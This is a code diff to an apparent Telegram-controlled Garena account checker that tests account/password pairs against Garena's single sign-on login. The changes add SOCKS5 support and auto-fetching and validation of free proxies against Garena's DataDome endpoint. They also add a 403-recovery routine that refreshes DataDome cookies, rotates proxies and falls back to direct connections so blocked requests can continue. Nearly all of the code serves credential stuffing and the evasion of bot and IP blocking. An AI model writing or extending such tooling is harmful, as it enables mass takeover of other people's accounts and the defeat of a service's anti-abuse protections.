@@ -117,11 +117,17 @@ def _init_proxy_folder():
         with open(sample, "w", encoding="utf-8") as f:
             f.write("# Add your proxies here (one per line)\n")
             f.write("# Supported formats:\n")
-            f.write("#   ip:port\n")
+            f.write("#   ip:port                          (auto-detect: SOCKS5 if port is 1080/1081/4145/9050)\n")
             f.write("#   user:pass@ip:port\n")
             f.write("#   http://ip:port\n")
             f.write("#   http://user:pass@ip:port\n")
+            f.write("#   https://ip:port\n")
+            f.write("#   socks5://ip:port                 (recommended for HTTPS sites like Garena)\n")
+            f.write("#   socks5://user:pass@ip:port\n")
             f.write("#   ip:port:user:pass\n")
+            f.write("#\n")
+            f.write("# SOCKS5 proxies are auto-detected by port number and work best for Garena.\n")
+            f.write("# Free proxies are auto-fetched from multiple sources every 3 minutes.\n")
         print(f"\033[92m📁 proxy/ folder created — add your proxy .txt files inside it\033[0m")
 
 _init_proxy_folder()
@@ -184,6 +190,9 @@ class GeoRotator:
         self._load_all_files()
         self._current_proxy = self._proxies[0] if self._proxies else None
 
+    # ── Known SOCKS5 ports — auto-detect SOCKS5 even without scheme ──
+    _SOCKS5_PORTS = {1080, 1081, 4145, 4146, 9050, 9051, 9052, 9053, 10800, 10801, 28100}
+
     def _normalize_proxy(self, line):
         """
         Normalize a proxy line into a valid URL string.
@@ -191,51 +200,73 @@ class GeoRotator:
         Supported input formats:
           1. http://host:port
           2. https://host:port
-          3. http://user:pass@host:port
-          4. https://user:pass@host:port
-          5. host:port                          → http://host:port
-          6. user:pass@host:port                → http://user:pass@host:port
-          7. ip:port:username:password          → http://username:password@ip:port
-          8. ip:port:username:password (https)  → detected if scheme prefix present
+          3. socks5://host:port / socks5h://host:port
+          4. http://user:pass@host:port
+          5. https://user:pass@host:port
+          6. socks5://user:pass@host:port
+          7. host:port                          → auto-detect: SOCKS5 if known port, else http
+          8. user:pass@host:port                → http://user:pass@host:port
+          9. ip:port:username:password          → http://username:password@ip:port
+         10. ip:port:username:password (https)  → detected if scheme prefix present
 
         Returns a normalized URL string, or None if the line is invalid.
         """
         original = line
+        line = line.strip()
+        if not line or line.startswith("#"):
+            return None
 
         # ── Step 1: Detect and strip explicit scheme ──────────────────────────
-        scheme = "http"
-        if line.lower().startswith("https://"):
+        scheme = "http"  # default
+        if line.lower().startswith("socks5h://"):
+            scheme = "socks5h"
+            line = line[10:]
+        elif line.lower().startswith("socks5://"):
+            scheme = "socks5h"  # use socks5h for remote DNS resolution
+            line = line[8:]
+        elif line.lower().startswith("socks4://"):
+            scheme = "socks5h"  # upgrade socks4 to socks5h
+            line = line[8:]
+        elif line.lower().startswith("https://"):
             scheme = "https"
             line = line[8:]
         elif line.lower().startswith("http://"):
             scheme = "http"
             line = line[7:]
 
-        # ── Step 2: Detect user:pass@host:port (already has @) ───────────────
+        # ── Step 2: Detect user:pass@host:port (already has @) ──
         if "@" in line:
             # Format: user:pass@host:port  — rebuild cleanly
             creds, _, hostport = line.partition("@")
             parts = hostport.rsplit(":", 1)
             if len(parts) == 2 and parts[1].isdigit():
+                # Auto-detect SOCKS5 by port even with auth
+                if scheme == "http" and int(parts[1]) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 return f"{scheme}://{creds}@{hostport}"
             logging.getLogger(__name__).warning(
                 f"[GEO] ⚠️  Skipping malformed proxy (bad host:port after @): {original}"
             )
             return None
 
-        # ── Step 3: Split by ':' to detect format ────────────────────────────
+        # ── Step 3: Split by ':' to detect format ──────────────────────────
         parts = line.split(":")
 
         if len(parts) == 2:
             # Format: host:port
             host, port_str = parts
             if host and port_str.isdigit():
+                # Auto-detect SOCKS5 by well-known ports
+                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 return f"{scheme}://{host}:{port_str}"
 
         elif len(parts) == 4:
             # Format: ip:port:username:password
             ip, port_str, username, password = parts
             if ip and port_str.isdigit():
+                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 return f"{scheme}://{username}:{password}@{ip}:{port_str}"
 
         elif len(parts) == 3:
@@ -243,6 +274,8 @@ class GeoRotator:
             # Try host:port (ignore third segment with a warning)
             host, port_str, extra = parts
             if host and port_str.isdigit():
+                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
+                    scheme = "socks5h"
                 logging.getLogger(__name__).warning(
                     f"[GEO] ⚠️  Proxy has 3 colon-parts, treating as host:port (ignoring '{extra}'): {original}"
                 )
@@ -497,19 +530,103 @@ geo_rotator = GeoRotator()
 #  deduplicates against the current pool, and saves new ones.
 # ══════════════════════════════════════════════════════════════
 RAW_PROXY_SOURCES = [
+    # ── HTTP/HTTPS proxies ──
     "https://worker-production-a615.up.railway.app/",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=all",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=no&anonymity=elite",
+    # ── SOCKS5 proxies (better for HTTPS tunneling) ──
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+    # ── HTTP proxies (backup) ──
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
 ]
-RAW_PROXY_FETCH_INTERVAL = 300  # 5 minutes
+RAW_PROXY_FETCH_INTERVAL = 180  # 3 minutes — faster refresh for better proxy availability
 RAW_PROXY_SAVE_FILE = os.path.join(PROXY_FOLDER, "raw_fetched_proxies.txt")
+RAW_PROXY_VALIDATE_ON_FETCH = True  # Validate proxies against Garena SSO before adding
+RAW_PROXY_VALIDATE_TIMEOUT = 6     # Seconds to wait for validation
+RAW_PROXY_VALIDATE_WORKERS = 10    # Parallel validation threads
+
+def _validate_proxy(proxy_url):
+    """Test a single proxy against Garena SSO prelogin endpoint.
+    Returns True if the proxy can reach Garena (any HTTP response, even 403 = IP works).
+    Returns False if the proxy is dead or can't connect."""
+    try:
+        sess = requests.Session()
+        sess.proxies = {"http": proxy_url, "https": proxy_url}
+        sess.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+        })
+        # Test against Garena's DataDome endpoint — lightweight check
+        resp = sess.get("https://dd.garena.com/js/", timeout=RAW_PROXY_VALIDATE_TIMEOUT, 
+                        allow_redirects=False)
+        # Any response (200, 403, etc.) means the proxy can reach Garena's servers
+        return resp.status_code is not None and resp.status_code != 0
+    except Exception:
+        return False
+    finally:
+        try:
+            sess.close()
+        except Exception:
+            pass
+
+
+def _validate_proxies_batch(proxy_list, max_workers=None):
+    """Validate a batch of proxies in parallel.
+    Returns a list of working proxy URLs."""
+    if not proxy_list:
+        return []
+    
+    if not RAW_PROXY_VALIDATE_ON_FETCH:
+        return proxy_list  # Skip validation
+    
+    max_workers = max_workers or RAW_PROXY_VALIDATE_WORKERS
+    log = logging.getLogger(__name__)
+    working = []
+    total = len(proxy_list)
+    
+    if total <= 5:
+        # Small batch — validate sequentially to avoid overhead
+        for p in proxy_list:
+            if _validate_proxy(p):
+                working.append(p)
+        log.info(f"[PROXY-VAL] {len(working)}/{total} proxies working (sequential)")
+        return working
+    
+    # Large batch — validate in parallel with ThreadPoolExecutor
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    
+    validated = 0
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        future_to_proxy = {executor.submit(_validate_proxy, p): p for p in proxy_list}
+        for future in as_completed(future_to_proxy):
+            validated += 1
+            proxy = future_to_proxy[future]
+            try:
+                if future.result(timeout=RAW_PROXY_VALIDATE_TIMEOUT + 2):
+                    working.append(proxy)
+            except Exception:
+                pass
+            # Log progress every 50 proxies
+            if validated % 50 == 0:
+                log.info(f"[PROXY-VAL] Progress: {validated}/{total} tested, {len(working)} working")
+    
+    log.info(f"[PROXY-VAL] ✅ {len(working)}/{total} proxies validated as working")
+    return working
+
 
 def _fetch_raw_proxies():
     """
-    Background worker: fetches raw proxy lists from configured URLs every 5 minutes.
-    Only new, unique proxies are appended to raw_fetched_proxies.txt.
+    Background worker: fetches raw proxy lists from configured URLs every 3 minutes.
+    Proxies are validated against Garena's endpoint before being added to the pool.
+    Only new, unique, working proxies are saved.
     """
     log = logging.getLogger(__name__)
     log.info(f"[RAW-PROXY] Auto-fetch started — {len(RAW_PROXY_SOURCES)} source(s), "
-             f"interval {RAW_PROXY_FETCH_INTERVAL}s")
+             f"interval {RAW_PROXY_FETCH_INTERVAL}s, validate={RAW_PROXY_VALIDATE_ON_FETCH}")
 
     os.makedirs(PROXY_FOLDER, exist_ok=True)
     normalizer = geo_rotator._normalize_proxy
@@ -518,6 +635,10 @@ def _fetch_raw_proxies():
         total_new = 0
         total_fetched = 0
         total_dupes = 0
+        total_validated = 0
+        total_dead = 0
+
+        all_new_proxies = []  # Collect all new proxies across sources before validation
 
         for url in RAW_PROXY_SOURCES:
             try:
@@ -544,7 +665,6 @@ def _fetch_raw_proxies():
             with geo_rotator._lock:
                 pool_set = set(geo_rotator._proxies)
 
-            new_proxies = []
             dupes = 0
             for raw_line in lines:
                 normalized = normalizer(raw_line)
@@ -553,18 +673,28 @@ def _fetch_raw_proxies():
                 if normalized in existing or normalized in pool_set:
                     dupes += 1
                     continue
-                new_proxies.append(normalized)
+                all_new_proxies.append(normalized)
                 existing.add(normalized)
                 pool_set.add(normalized)
 
             total_dupes += dupes
 
-            if new_proxies:
+        # ── Validate all new proxies in one batch ──
+        if all_new_proxies:
+            total_validated = len(all_new_proxies)
+            if RAW_PROXY_VALIDATE_ON_FETCH:
+                log.info(f"[RAW-PROXY] Validating {total_validated} new proxies...")
+                working_proxies = _validate_proxies_batch(all_new_proxies)
+                total_dead = total_validated - len(working_proxies)
+            else:
+                working_proxies = all_new_proxies
+
+            if working_proxies:
                 try:
                     with open(RAW_PROXY_SAVE_FILE, "a", encoding="utf-8") as f:
-                        for p in new_proxies:
+                        for p in working_proxies:
                             f.write(p + "\n")
-                    total_new += len(new_proxies)
+                    total_new = len(working_proxies)
                 except OSError as e:
                     log.error(f"[RAW-PROXY] Failed to write {RAW_PROXY_SAVE_FILE}: {e}")
 
@@ -574,16 +704,16 @@ def _fetch_raw_proxies():
             except Exception as e:
                 log.error(f"[RAW-PROXY] Failed to reload proxy pool: {e}")
 
-            log.info(f"[RAW-PROXY] +{total_new} new proxies added "
-                     f"(fetched {total_fetched}, {total_dupes} dupes skipped) "
-                     f"| pool now: {geo_rotator.total}")
+            log.info(f"[RAW-PROXY] +{total_new} new working proxies added "
+                     f"(fetched {total_fetched}, {total_dupes} dupes, "
+                     f"{total_dead} dead filtered) | pool now: {geo_rotator.total}")
         else:
             log.debug(f"[RAW-PROXY] No new proxies this cycle "
-                      f"(fetched {total_fetched}, {total_dupes} dupes)")
+                      f"(fetched {total_fetched}, {total_dupes} dupes, "
+                      f"{total_dead} dead filtered)")
 
         # Wait for next cycle (interruptible by shutdown)
         shutdown_event.wait(RAW_PROXY_FETCH_INTERVAL)
-
 
 def signal_handler(signum, frame):
     """Handle SIGINT (Ctrl+C) and SIGTERM (process manager shutdown) gracefully."""
@@ -730,16 +860,25 @@ class DataDomeManager:
         self.current_datadome = None
         self.datadome_history = []
         self._403_attempts = 0
+        self._cookie_timestamp = 0  # When the current cookie was obtained
+        self._cookie_max_age = 300   # Cookies expire after 5 minutes
         
     def set_datadome(self, datadome_cookie):
         if datadome_cookie and datadome_cookie != self.current_datadome:
             self.current_datadome = datadome_cookie
             self.datadome_history.append(datadome_cookie)
+            self._cookie_timestamp = time.time()
             if len(self.datadome_history) > 10:
                 self.datadome_history.pop(0)
             
     def get_datadome(self):
         return self.current_datadome
+    
+    def is_cookie_stale(self):
+        """Check if the current DataDome cookie might be expired."""
+        if not self.current_datadome:
+            return True
+        return (time.time() - self._cookie_timestamp) > self._cookie_max_age
         
     def extract_datadome_from_session(self, session):
         try:
@@ -772,35 +911,83 @@ class DataDomeManager:
             logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
             return False
 
+    def refresh_datadome(self, session):
+        """Force-fetch a fresh DataDome cookie through the session's current proxy.
+        Returns True if a new cookie was obtained."""
+        try:
+            fresh_dd = get_datadome_cookie(session)
+            if fresh_dd:
+                self.set_datadome(fresh_dd)
+                self.set_session_datadome(session, fresh_dd)
+                logger.info(f"[DD] 🍪 Fresh DataDome cookie obtained via proxy")
+                return True
+            else:
+                logger.warning(f"[DD] ⚠️ Failed to get DataDome cookie from current proxy")
+                return False
+        except Exception as e:
+            logger.warning(f"[DD] ⚠️ Error refreshing DataDome: {e}")
+            return False
+
     def handle_403(self, session, telegram_config=None):
-        """On EVERY 403 — immediately force-rotate proxy, refresh DataDome, resume."""
+        """On 403 — try DataDome refresh first, then proxy rotation.
+        
+        Recovery strategy (in order):
+        1. If cookie is stale or missing → try refreshing DataDome on current proxy
+        2. Force-rotate proxy + get fresh DataDome
+        3. Smart-rotate proxy + get fresh DataDome  
+        4. If no proxies available, try direct connection with fresh DataDome
+        """
         self._403_attempts += 1
 
-        old_proxy = geo_rotator.current_proxy
+        logger.warning(f"[403] 🚫 Access denied (attempt #{self._403_attempts})")
 
-        logger.warning(f"[403] 🚫 Access denied — force-rotating proxy instantly... (attempt #{self._403_attempts})")
+        # ── Step 1: Try refreshing DataDome on current proxy first ──
+        if self.is_cookie_stale() or not self.current_datadome:
+            logger.info(f"[403] 🔄 Cookie stale/missing — refreshing DataDome on current proxy...")
+            if self.refresh_datadome(session):
+                self._403_attempts = 0
+                logger.info(f"[403] ✅ Recovered with fresh DataDome (same proxy)")
+                return True
 
-        # ── Try up to 3 proxy rotations for fast recovery ────────────────────
-        for rot_attempt in range(3):
+        # ── Step 2: Try up to 5 proxy rotations for recovery ──
+        max_rotations = min(5, max(3, geo_rotator.total // 10))  # Scale with pool size
+        for rot_attempt in range(max_rotations):
             try:
                 if rot_attempt == 0:
                     new_proxy = geo_rotator.force_rotate()
                 else:
                     new_proxy = geo_rotator.smart_rotate()
+                    
+                if not new_proxy:
+                    logger.warning(f"[403] ⚠️ No proxy available for rotation (pool empty)")
+                    break
+                    
                 session.proxies.update(geo_rotator.get_proxies())
-                logger.info(f"[403] ✅ Thread {threading.get_ident()} rotated → {new_proxy}")
+                logger.info(f"[403] 🔄 Rotated → {new_proxy}")
 
-                new_datadome = get_datadome_cookie(session)
-                if new_datadome:
-                    self.set_datadome(new_datadome)
-                    self.set_session_datadome(session, new_datadome)
+                # Try getting fresh DataDome through new proxy
+                if self.refresh_datadome(session):
                     self._403_attempts = 0
-                    logger.info(f"[403] 🍪 Fresh DataDome obtained | New proxy: {new_proxy}")
+                    logger.info(f"[403] ✅ Fresh DataDome + new proxy: {new_proxy}")
                     return True
+                    
             except Exception as e:
                 logger.warning(f"[403] ⚠️ Rotation attempt {rot_attempt+1} failed: {e}")
 
-        logger.error(f"[403] ❌ Failed to recover after 3 proxy rotations — skipping account")
+        # ── Step 3: Last resort — try direct connection (no proxy) with fresh DataDome ──
+        if geo_rotator.total > 0:
+            logger.warning(f"[403] 🔄 All proxies exhausted — trying direct connection...")
+            session.proxies.clear()
+            if self.refresh_datadome(session):
+                self._403_attempts = 0
+                logger.info(f"[403] ✅ Direct connection + fresh DataDome works!")
+                # Restore proxy for subsequent requests
+                session.proxies.update(geo_rotator.get_proxies())
+                return True
+            # Restore proxy even on failure
+            session.proxies.update(geo_rotator.get_proxies())
+
+        logger.error(f"[403] ❌ Failed to recover after {max_rotations} rotations — skipping account")
         return False
 
 class LiveStats:
@@ -1240,7 +1427,12 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         'id': str(int(time.time() * 1000))
     }
     
-    retries = 2  # 2 fast retries (IP_BLOCK outer loop handles proxy rotation)
+    # ── Pre-fetch DataDome if stale or missing ──
+    if datadome_manager.is_cookie_stale() or not datadome_manager.get_datadome():
+        logger.info(f"   🍪 DataDome cookie stale/missing — refreshing before prelogin...")
+        datadome_manager.refresh_datadome(session)
+    
+    retries = 3  # 3 retries (up from 2) for better recovery
     for attempt in range(retries):
         try:
             current_cookies = session.cookies.get_dict()
@@ -1274,7 +1466,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             if attempt > 0:
                 logger.info(f"      🔄 Retry {attempt + 1}/{retries}")
             
-            response = session.get(url, headers=headers, params=params, timeout=5)
+            response = session.get(url, headers=headers, params=params, timeout=8)
             
             new_cookies = {}
             
@@ -1307,19 +1499,23 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             
             new_datadome = new_cookies.get('datadome')
             
+            # ── Handle 403 DataDome challenge ──
             if response.status_code == 403:
-                logger.error(f"      🚫 Access denied (403)")
-                logger.error(f"      🛡️ Security check triggered")
+                logger.warning(f"      🚫 403 — DataDome challenge detected (attempt {attempt+1}/{retries})")
                 
+                # If we got new cookies, try immediately with them
                 if new_cookies and attempt < retries - 1:
-                    logger.info(f"      🔄 Retrying with new cookies...")
+                    logger.info(f"      🍪 Got new cookies from 403 response — retrying...")
+                    datadome_manager.refresh_datadome(session)
                     backoff(attempt)
                     continue
                 
+                # Let DataDomeManager handle the 403 (proxy rotation + DD refresh)
                 if datadome_manager.handle_403(session, telegram_config=telegram_config):
+                    # Recovery succeeded — signal to outer loop to retry with new proxy/DD
                     return "IP_BLOCKED", None, None
                 else:
-                    logger.error(f"      🚨 IP blocked - cannot continue")
+                    logger.error(f"      🚨 DataDome block unrecoverable — skipping account")
                     return None, None, new_datadome
             
             response.raise_for_status()
@@ -1327,24 +1523,37 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             try:
                 data = response.json()
             except json.JSONDecodeError:
-                logger.error(f"      ✘ Invalid response format")
-                logger.error(f"      📄 Could not parse server response")
+                logger.error(f"      ✗ Invalid response format")
+                # Check if response looks like a DataDome challenge
+                resp_text = response.text[:200] if response.text else ""
+                if "captcha-delivery" in resp_text:
+                    logger.warning(f"      🛡️ Response contains DataDome CAPTCHA redirect")
+                    if attempt < retries - 1:
+                        datadome_manager.refresh_datadome(session)
+                        backoff(attempt)
+                        continue
                 if attempt < retries - 1:
                     backoff(attempt)
                     continue
                 return None, None, new_datadome
             
             if 'error' in data:
-                logger.error(f"      ✘ Error: {data['error']}")
-                logger.error(f"      ⚠️ Server returned an error")
+                error_msg = data.get('error', '')
+                # Distinguish between "account not found" and DataDome errors
+                if 'captcha' in str(error_msg).lower() or 'blocked' in str(error_msg).lower():
+                    logger.warning(f"      🛡️ DataDome error in response: {error_msg}")
+                    if attempt < retries - 1:
+                        datadome_manager.refresh_datadome(session)
+                        backoff(attempt)
+                        continue
+                logger.error(f"      ✗ Error: {error_msg}")
                 return None, None, new_datadome
                 
             v1 = data.get('v1')
             v2 = data.get('v2')
             
             if not v1 or not v2:
-                logger.error(f"      ✘ Missing authentication data")
-                logger.error(f"      📋 Incomplete server response")
+                logger.error(f"      ✗ Missing authentication data")
                 return None, None, new_datadome
                 
             logger.info(f"   ✔ Prelogin successful")
@@ -1354,8 +1563,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         except requests.exceptions.HTTPError as e:
             if hasattr(e, 'response') and e.response is not None:
                 if e.response.status_code == 403:
-                    logger.error(f"      🚫 Access denied (403)")
-                    logger.error(f"      🛡️ Security check triggered")
+                    logger.warning(f"      🚫 403 (HTTPError) — DataDome challenge")
                     
                     new_cookies = {}
                     if 'set-cookie' in e.response.headers:
@@ -1374,23 +1582,22 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                                     pass
                     
                     if new_cookies and attempt < retries - 1:
-                        logger.info(f"      🔄 Retrying with new cookies...")
+                        logger.info(f"      🍪 Got new cookies from 403 — retrying...")
+                        datadome_manager.refresh_datadome(session)
                         backoff(attempt)
                         continue
                     
                     if datadome_manager.handle_403(session, telegram_config=telegram_config):
                         return "IP_BLOCKED", None, None
                     else:
-                        logger.error(f"      🚨 IP blocked - cannot continue")
+                        logger.error(f"      🚨 DataDome block unrecoverable")
                         return None, None, new_cookies.get('datadome')
                 else:
-                    logger.error(f"      ✘ HTTP {e.response.status_code}")
-                    logger.error(f"      🖥️ Server error")
+                    logger.error(f"      ✗ HTTP {e.response.status_code}")
             else:
-                logger.error(f"      ✘ Connection error")
-                logger.error(f"      🌐 Could not reach server")
+                logger.error(f"      ✗ Connection error")
                 
-            if attempt < retries - 2:
+            if attempt < retries - 1:
                 backoff(attempt)
                 continue
         except requests.exceptions.ConnectionError as e:
@@ -1403,11 +1610,11 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
 
         except Exception as e:
             err = str(e)
-            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError')):
+            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError', 'SOCKS')):
                 logger.warning(f"      🔌 Proxy connection failed: {err[:80]}")
                 return "CONN_ERROR", None, None
             logger.error(f"      💥 Unexpected error: {err[:50]}")
-            if attempt < retries - 2:
+            if attempt < retries - 1:
                 backoff(attempt)
                 
     return None, None, None
@@ -2016,32 +2223,43 @@ def parse_account_details(data):
 
 def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None):
     try:
-        MAX_IP_BLOCK_RETRIES = 2   # 2 fast retries — don't waste time on dead proxies
+        MAX_IP_BLOCK_RETRIES = 3   # 3 retries (up from 2) — better recovery with improved DD handling
         v1, v2, new_datadome = None, None, None
 
         for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
+            # ── Ensure session has a fresh DataDome cookie before each attempt ──
             datadome_manager.clear_session_datadome(session)
             current_datadome = datadome_manager.get_datadome()
             if current_datadome:
                 datadome_manager.set_session_datadome(session, current_datadome)
+            elif datadome_manager.is_cookie_stale():
+                # Cookie is stale — try refreshing it before prelogin
+                datadome_manager.refresh_datadome(session)
 
             v1, v2, new_datadome = prelogin(session, account, datadome_manager, telegram_config=telegram_config)
 
             if v1 == "IP_BLOCKED":
-                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — rotating proxy...")
+                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — rotating proxy + refreshing DataDome...")
+                # Try force-rotate first
                 new_proxy = geo_rotator.force_rotate()
-                session.proxies.update(geo_rotator.get_proxies())
-                # Refresh datadome on new proxy
-                fresh_dd = get_datadome_cookie(session)
-                if fresh_dd:
-                    datadome_manager.set_datadome(fresh_dd)
-                    datadome_manager.set_session_datadome(session, fresh_dd)
+                if new_proxy:
+                    session.proxies.update(geo_rotator.get_proxies())
+                    # Refresh DataDome on new proxy
+                    datadome_manager.refresh_datadome(session)
+                else:
+                    logger.warning(f"[RETRY] No proxy available for rotation — trying direct connection")
+                    session.proxies.clear()
+                    datadome_manager.refresh_datadome(session)
                 continue
 
             if v1 == "CONN_ERROR":
                 logger.warning(f"[RETRY] Connection error attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — smart rotating...")
-                geo_rotator.smart_rotate()
-                session.proxies.update(geo_rotator.get_proxies())
+                new_proxy = geo_rotator.smart_rotate()
+                if new_proxy:
+                    session.proxies.update(geo_rotator.get_proxies())
+                else:
+                    logger.warning(f"[RETRY] No proxy available — trying direct connection")
+                    session.proxies.clear()
                 continue
 
             break  # prelogin succeeded or hard-failed — exit retry loop
@@ -2049,7 +2267,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         if v1 in ("IP_BLOCKED", "CONN_ERROR"):
             logger.error(f"[RETRY] Exhausted {MAX_IP_BLOCK_RETRIES} retries for {account} — skipping")
             live_stats.update_stats(valid=False)
-            return f"🚨 Proxy exhausted - Skipped after {MAX_IP_BLOCK_RETRIES} retries"
+            reason = "🛡️ DataDome blocked" if v1 == "IP_BLOCKED" else "🔌 Proxy exhausted"
+            return f"🚨 {reason} - Skipped after {MAX_IP_BLOCK_RETRIES} retries"
 
         if not v1 or not v2:
             live_stats.update_stats(valid=False)
@@ -2631,7 +2850,12 @@ def print_banner():
 def create_thread_session(cookie_manager, datadome_manager):
     """Create a fast cloudscraper session with keep-alive and lean connection pools.
     Each thread only talks to ~3 hosts (sso.garena, account.garena, codm.garena)
-    so large pools waste RAM. Keep pools tiny → more threads can run at once."""
+    so large pools waste RAM. Keep pools tiny → more threads can run at once.
+    
+    Proxy strategy:
+    1. If proxies available → use them (DataDome bypass via clean IP)
+    2. If no proxies → try direct connection (works on non-flagged IPs)
+    3. Always attempt to get a fresh DataDome cookie for the session"""
     sess = cloudscraper.create_scraper()
     adapter = requests.adapters.HTTPAdapter(
         pool_connections=3,
@@ -2646,8 +2870,16 @@ def create_thread_session(cookie_manager, datadome_manager):
         "Accept-Encoding":  "gzip, deflate, br",
         "Accept":           "application/json, text/plain, */*",
     })
-    # Set proxy FIRST so datadome fetch also goes through this thread's proxy
-    sess.proxies.update(geo_rotator.get_proxies())
+    
+    # ── Set proxy — if available ──
+    proxy_dict = geo_rotator.get_proxies()
+    if proxy_dict:
+        sess.proxies.update(proxy_dict)
+        logger.info(f"[SESSION] Thread {threading.get_ident()} using proxy: {proxy_dict.get('https', 'N/A')}")
+    else:
+        logger.warning(f"[SESSION] Thread {threading.get_ident()} ⚠️ No proxy available — using direct connection")
+    
+    # ── DataDome cookie setup ──
     valid_cookies = cookie_manager.get_valid_cookies()
     if valid_cookies:
         combined_cookie_str = "; ".join(valid_cookies)
@@ -2660,10 +2892,16 @@ def create_thread_session(cookie_manager, datadome_manager):
         )
         if datadome_value:
             datadome_manager.set_datadome(datadome_value)
-    else:
+    
+    # Always try to get a fresh DataDome cookie (even if we loaded one from file)
+    if not datadome_manager.current_datadome or datadome_manager.is_cookie_stale():
         datadome = get_datadome_cookie(sess)
         if datadome:
             datadome_manager.set_datadome(datadome)
+            datadome_manager.set_session_datadome(sess, datadome)
+        elif not datadome_manager.current_datadome:
+            logger.warning(f"[SESSION] ⚠️ Could not obtain DataDome cookie — accounts may fail with 403")
+    
     return sess
 
 
@@ -2986,6 +3224,7 @@ def _tg_set_commands(token: str):
         {"command": "upload_proxy",   "description": "📡 Upload proxy list"},
         {"command": "proxy_done",     "description": "✅ Finish proxy upload & save"},
         {"command": "proxystatus",    "description": "📊 View proxy pool status"},
+        {"command": "testproxy",      "description": "🧪 Test proxy connectivity"},
         {"command": "serverstatus",   "description": "🖥 Server load & limits"},
         {"command": "setthreads",    "description": "🔧 Set checker threads (e.g. /setthreads 10)"},
         {"command": "add_coowner",    "description": "👥 Add a co-owner by Telegram ID"},
@@ -4261,11 +4500,20 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
             dm = DataDomeManager()
             thread_local.session = create_thread_session(cookie_manager, dm)
             thread_local.dm      = dm
-            thread_local.session.proxies.update(geo_rotator.get_proxies())
+            # Only update proxies if we have some (create_thread_session already set them)
+            proxy_dict = geo_rotator.get_proxies()
+            if proxy_dict:
+                thread_local.session.proxies.update(proxy_dict)
             with _all_sessions_lock:
                 _all_sessions.append(thread_local.session)
         else:
-            thread_local.session.proxies.update(geo_rotator.get_proxies())
+            # Refresh proxy for existing session
+            proxy_dict = geo_rotator.get_proxies()
+            if proxy_dict:
+                thread_local.session.proxies.update(proxy_dict)
+            else:
+                # No proxies available — clear proxy settings (try direct)
+                thread_local.session.proxies.clear()
         return thread_local.session, thread_local.dm
 
     # ── Helper: process a single account line ──
@@ -6408,37 +6656,74 @@ def _handle_proxy_upload(token: str, chat_id, from_user: dict, message: dict):
 
 
 def _handle_proxy_status(token: str, chat_id, from_user: dict):
-    """Show current proxy files and counts."""
+    """Show current proxy files, counts, DataDome status, and connectivity check."""
     if not _is_owner(from_user):
         _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
         return
 
     files = _get_proxy_files()
+    pool_size = geo_rotator.total
+    
+    # ── Proxy file listing ──
     if not files:
-        _tg_send(token, chat_id,
-            "📡 <b>Proxy Files</b>\n\n"
-            "<i>No proxy files found in proxy/ folder.</i>\n\n"
-            "Use <code>/upload_proxy</code> to upload one.")
-        return
-
-    lines_out = []
-    total = 0
-    for fpath in files:
-        fname = os.path.basename(fpath)
-        try:
-            size_kb = os.path.getsize(fpath) / 1024
-            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
-                count = sum(1 for l in f if l.strip() and not l.startswith("#") and ":" in l)
-        except Exception:
-            count, size_kb = 0, 0
-        total += count
-        lines_out.append(f"  📄 {fname}\n  📊 {count:,} proxies · {size_kb:.1f}KB")
-
-    body = "\n\n".join(lines_out)
+        file_info = "<i>No proxy files found in proxy/ folder.</i>\n\n"
+        file_info += "Use <code>/upload_proxy</code> to upload one.\n"
+        file_info += "Free proxies are auto-fetched every 3 minutes."
+    else:
+        lines_out = []
+        total = 0
+        for fpath in files:
+            fname = os.path.basename(fpath)
+            try:
+                size_kb = os.path.getsize(fpath) / 1024
+                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
+                    count = sum(1 for l in f if l.strip() and not l.startswith("#") and ":" in l)
+            except Exception:
+                count, size_kb = 0, 0
+            total += count
+            lines_out.append(f"  📄 {fname}\n  📊 {count:,} proxies · {size_kb:.1f}KB")
+        body = "\n\n".join(lines_out)
